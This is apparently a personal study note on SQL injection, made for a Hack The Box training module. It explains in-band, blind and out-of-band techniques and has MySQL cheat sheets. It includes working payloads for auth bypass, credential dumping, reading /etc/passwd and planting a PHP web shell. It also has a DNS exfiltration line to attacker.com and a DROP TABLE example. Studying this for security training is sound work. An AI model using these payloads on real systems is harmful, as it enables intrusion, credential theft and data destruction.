# SQL Injection
The goal is to inject SQL into web apps that utlimately change the final SQL query sent by the web app to it's database - resulting in performing your own SQL queries directly against the database.

There are two types of databases, relational and non-relational -
- Relational Databases (SQL):
    - Structure: Data is organized in tables with rows and columns, like a spreadsheet
    - Relationships: Tables can connect to each other through shared keys
    - Schema: Fixed structure - you must define columns and data types upfront
    - Best for: Structured data with clear relationships (banking, inventory, user accounts)
    - Examples: MySQL, PostgreSQL, Oracle
- Non-Relational Databases (NoSQL)
    - Structure: Data can be stored in various flexible formats (documents, key-value pairs, graphs)
    - Relationships: Limited or no built-in relationships between data
    - Schema: Flexible structure - you can add different fields to each record
    - Best for: Unstructured or rapidly changing data (social media posts, IoT sensors, content management)
    - Examples: MongoDB, Redis, Cassandra

## 3 types of SQLi
#### In-band - Where the attacker receives results directly in the same communication channel they used to send the attack. First choice when application shows database errors or results
- Union based
    - How it works: Uses the UNION operator to combine results from the original query with results from a malicious query
    - Requirements: Both queries must have the same number of columns with compatible data types
    - Process: Determine number of columns (ORDER BY or trial/error) --> Find which columns display data --> Extract information using UNION SELECT
    - Example: `' UNION SELECT username,password FROM users-- -`
    - 
    - Best case scenario: Full database dump possible
- Error based
    - How it works: Forces the database to produce error messages that reveal information
    - Process: Craft queries that cause deliberate errors containing sensitive data
    - Example: `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
    - Limitation: Only small amounts of data per error

#### Blind - Where no direct output is returned, so attackers infer information based on application behavior.
- Boolean (When application responds differently to true/false conditions)
    - How it works: Sends queries that return True/False responses based on application behavior
    - Process: Ask yes/no questions about the database
    - Example:`' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'-- -` If page loads normally = True, if error/different page = False
    - Characteristics: Slow process, requires many requests
- Time based (When no visible differences exist, but timing can be measured)
    - How it works: Uses database functions that cause delays to infer True/False
    - Process: Measure response times to determine if conditions are met
    - Example: `' AND IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a',SLEEP(5),0)-- -`
    - Logic: If condition is true, page takes 5+ seconds to load
    - Characteristics: Very slow, but works when no other feedback exists
      
#### Out-of-band - where it uses different communication channels to receive results (separate from the attack channel). Used w2hen all other methods fail, or for stealth/speed in advanced scenarios.
- How it works:
    - Triggers database to make external connections (HTTP, DNS, SMB)
    - Data is sent to attacker-controlled external server
    - Useful when in-band methods don't work due to firewalls/filtering

- Common techniques:
    - DNS exfiltration: `' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -`
    - HTTP requests: Database makes HTTP calls to attacker's server with data in URL
    - Email: Some databases can send emails with extracted data

- Requirements:
    - Database must have network access
    - Specific database functions enabled (like xp_cmdshell in SQL Server)
    - Attacker needs external infrastructure to receive data

Characteristics:

Most complex to set up
Often fastest for large data extraction
Bypasses many filtering mechanisms
Requires advanced database privileges

# Resources

# Good Examples

# Tooling

# Methodology TLDR

# Useful Commands + Syntax
| **Description** | **Command** |
|-----------------|-------------|
| Auth to MySQL/MariaDB. There shouldn't be any spaces between `-p` and the password. No host specified so it'll default to localhost | `mysql -u root -p` or `mysql -u root -p<password>` |
| Auth to a specific host | `mysql -u root -h docker.hackthebox.eu -P 3306 -p ` | 
| Displays the privileges and roles that are assigned to a MySQL user account or role | [SHOW GRANTS](https://dev.mysql.com/doc/refman/8.0/en/show-grants.html) |
| SHOW DATABASES lists the databases on the MySQL server host | [SHOW DATABASES](https://dev.mysql.com/doc/refman/8.0/en/show-databases.html) |
| The DESCRIBE and EXPLAIN statements are synonyms. Both used to obtain information about table structure | [DESCRIBE / EXPLAIN](https://dev.mysql.com/doc/refman/8.0/en/explain.html) |
| Order the output | [ORDER BY](https://dev.mysql.com/doc/refman/8.0/en/order-by-optimization.html) | 
| Limit the output to a set number | [LIMIT](https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html)
| SQL pattern matching enables you to use _ to match any single character and % to match an arbitrary number of characters (including zero characters) | [LIKE](https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html) |

# SQLi Testing Payloads

# SQLi Payloads

# SQLi Bypasses

# Notes
- The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.
- Similar to that of XSS, you need to first think about the context of where your input is getting placed inside the code, like here where we accept user input and pass it directly to the SQL query without sanitization:
```
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
- If we input SHOW `DATABASES;`, it would be executed as `'%SHOW DATABASES;'` and show us all usernames that are like SHOW DATABASES. What we want to do in this case is add (') which will end the user-input field, and after it, we can write actual SQL code: `1'; DROP TABLE users;`. Resulting in this code `select * from logins where username like '%1'; DROP TABLE users;'`


# Tricks & Quirks
Using PHP you can connect to a database and start using MySQL all within the PHP:
```
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```
This will store the queries output to `$result` and print it. Or this:
```
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

# HTB Module Questions
## SQL Injection Fundamentals 
# HTB Cheat Sheet
| **Description** | **Command** |
|----------------|-------------|
| **General** |  |
| login to mysql database | `mysql -u root -h docker.hackthebox.eu -P 3306 -p` |
| List available databases | `SHOW DATABASES` |
| Switch to database | `USE users` |
| **Tables** |  |
| Add a new table | `CREATE TABLE logins (id INT, ...)` |
| List available tables in current database | `SHOW TABLES` |
| Show table properties and columns | `DESCRIBE logins` |
| Add values to table | `INSERT INTO table_name VALUES (value_1,..)` |
| Add values to specific columns in a table | `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` |
| Update table values | `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` |
| **Columns** |  |
| Show all columns in a table | `SELECT * FROM table_name` |
| Show specific columns in a table | `SELECT column1, column2 FROM table_name` |
| Delete a table | `DROP TABLE logins` |
| Add new column | `ALTER TABLE logins ADD newColumn INT` |
| Rename column | `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` |
| Change column datatype | `ALTER TABLE logins MODIFY oldColumn DATE` |
| Delete column | `ALTER TABLE logins DROP oldColumn` |
| **Output** |  |
| Sort by column | `SELECT * FROM logins ORDER BY column_1` |
| Sort by column in descending order | `SELECT * FROM logins ORDER BY column_1 DESC` |
| Sort by two-columns | `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` |
| Only show first two results | `SELECT * FROM logins LIMIT 2` |
| Only show first two results starting from index 2 | `SELECT * FROM logins LIMIT 1, 2` |
| List results that meet a condition | `SELECT * FROM table_name WHERE <condition>` |
| List results where the name is similar to a given string (starts with admin) | `SELECT * FROM logins WHERE username LIKE 'admin%'` |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Description** | **Payload** |
|----------------|-------------|
| **Auth Bypass** |  |
| Basic Auth Bypass | `admin' or '1'='1` |
| Basic Auth Bypass With comments | `admin')-- -` |
| **Union Injection** |  |
| Detect number of columns using `order by` | `' order by 1-- -` |
| Detect number of columns using Union injection | `cn' UNION select 1,2,3-- -` |
| Basic Union injection | `cn' UNION select 1,@@version,3,4-- -` |
| Union injection for 4 columns | `UNION select username, 2, 3, 4 from passwords-- -` |
| **DB Enumeration** |  |
| Fingerprint MySQL with query output | `SELECT @@version` |
| Fingerprint MySQL with no output | `SELECT SLEEP(5)` |
| Current database name | `cn' UNION select 1,database(),2,3-- -` |
| List all databases | `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` |
| List all tables in a specific database | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` |
| List all columns in a specific table | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` |
| Dump data from a table in another database | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` |
| **Privileges** |  |
| Find current user | `cn' UNION SELECT 1, user(), 3, 4-- -` |
| Find if user has admin privileges | `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` |
| Find if all user privileges | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` |
| Find which directories can be accessed through MySQL | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` |
| **File Injection** |  |
| Read local file | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` |
| Write a string to a local file | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` |
| Write a web shell into the base web directory | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` |
